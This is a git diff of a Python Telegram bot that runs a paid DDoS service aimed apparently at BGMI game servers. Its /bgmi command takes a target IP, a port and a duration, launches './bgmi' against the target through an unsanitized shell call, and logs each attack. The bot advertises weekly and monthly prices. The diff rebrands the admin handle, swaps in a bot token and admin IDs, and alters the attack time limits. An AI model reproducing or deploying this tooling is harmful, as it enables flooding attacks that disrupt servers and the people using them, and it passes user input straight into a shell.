@@ -3,7 +3,7 @@
 
 
 # CMD : 1) pip install telebot, 2) pip install flask 3) chmod +x * 4) python server.py
-# dm : @Rajarohan24 if you faces any issue
+# dm : @Here_Sarcastic if you faces any issue
 
 import telebot
 import subprocess
@@ -11,14 +11,11 @@ import requests
 import datetime
 import os
 
-from keep_alive import keep_alive
-keep_alive()
-
 # insert your Telegram bot token here
-bot = telebot.TeleBot('7405040191AAHXLdzqs4VZlRJFncNGIBkQTnk5N998')
+bot = telebot.TeleBot('7230829849:AAFoRZgx_Nyx70PhVGiqgh2UVBniwtIKKHk')
 
 # Admin user IDs
-admin_id = ["6541124790", "", "", "User ID"]
+admin_id = ["5949303408", "", "", "User ID"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -28,7 +25,7 @@ LOG_FILE = "log.txt"
 
 # File To Store Free / Start Users 
 
-FREE_USER_FILE = "allm.txt"
+FREE_USER_FILE = "user.txt"
 
 
 # Function to read user IDs from the file
@@ -68,7 +65,7 @@ def log_command(user_id, target, port, time):
         username = f"UserID: {user_id}"
     
     with open(LOG_FILE, "a") as file:  # Open in "append" mode
-        file.write(f"Username: {username}\nTarget : {target}\nPort : {port}\nTime : {time}\n\@Rajarohan24")
+        file.write(f"Username: {username}\nTarget : {target}\nPort : {port}\nTime : {time}\n\@Here_Sarcastic")
 
 
 # Function to clear logs
@@ -250,19 +247,19 @@ def handle_bgmi(message):
             time = int(command[3])  # Convert port to integer
             if time > 280:
                 response = "Error : Time Support Only 280 Sec."
-            elif time < 380:
-                response = "Error : Time Support Only 380 Sec."
+            elif time < 280:
+                response = "Error : Time Support Only 280 Sec."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time) #cmd change kr lena 😁 [ line : 251 and 256
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 500"
+                full_command = f"./bgmi {target} {port} {time} 280"
                 subprocess.run(full_command, shell=True)
-                response = f"Attack Finished\n\nTarget : {target}\nPort : {port}\nTime : {time}\n\n🦋⃤𝗬𝗢𝗨𝗥 𝗔𝗗𝗠𝗜𝗡 ✮ @Rajarohan24"
+                response = f"Attack Finished\n\nTarget : {target}\nPort : {port}\nTime : {time}\n\n🦋⃤𝗬𝗢𝗨𝗥 𝗔𝗗𝗠𝗜𝗡 ✮ @Here_Sarcastic"
         else:
             response = "🖕 Usage :- /bgmi <target> <port> <time>\nCooldown Lag Gya Hai, Now Wait 10 second"  # Updated command syntax
     else:
-        response = "⛔ 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗡𝗼𝘁 𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱 𝗣𝗹𝗲𝗮𝘀𝗲 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝘁𝗼 𝗔𝗱𝗺𝗶𝗻 𝗮𝗻𝗱 𝗴𝗲𝘁 𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱 ⛔.\n🦋⃤𝗬𝗢𝗨𝗥 𝗔𝗗𝗠𝗜𝗡 ✮ @Rajarohan24"
+        response = "⛔ 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗡𝗼𝘁 𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱 𝗣𝗹𝗲𝗮𝘀𝗲 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝘁𝗼 𝗔𝗱𝗺𝗶𝗻 𝗮𝗻𝗱 𝗴𝗲𝘁 𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱 ⛔.\n🦋⃤𝗬𝗢𝗨𝗥 𝗔𝗗𝗠𝗜𝗡 ✮ @Here_Sarcastic"
 
     bot.reply_to(message, response)
 
@@ -308,7 +305,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''𝐅𝐨𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 𝐏𝐥𝐞𝐚𝐬𝐞 𝐑𝐮𝐧 𝐓𝐡𝐢𝐬 /bgmi 𝐂𝐨𝐦𝐦𝐚𝐧𝐝\n🦋⃤𝗬𝗢𝗨𝗥 𝗔𝗗𝗠𝗜𝗡 ✮ @Rajarohan24'''
+    response = f'''𝐅𝐨𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 𝐏𝐥𝐞𝐚𝐬𝐞 𝐑𝐮𝐧 𝐓𝐡𝐢𝐬 /bgmi 𝐂𝐨𝐦𝐦𝐚𝐧𝐝\n🦋⃤𝗬𝗢𝗨𝗥 𝗔𝗗𝗠𝗜𝗡 ✮ @Here_Sarcastic'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
@@ -333,7 +330,7 @@ Week-> 800 Rs
 Month-> 1200 Rs
 
 If You Want To Buy Private Server Contact Us. 
-🦋⃤𝗬𝗢𝗨𝗥 𝗔𝗗𝗠𝗜𝗡 ✮ @Rajarohan24
+🦋⃤𝗬𝗢𝗨𝗥 𝗔𝗗𝗠𝗜𝗡 ✮ @Here_Sarcastic
 '''
     bot.reply_to(message, response)
 
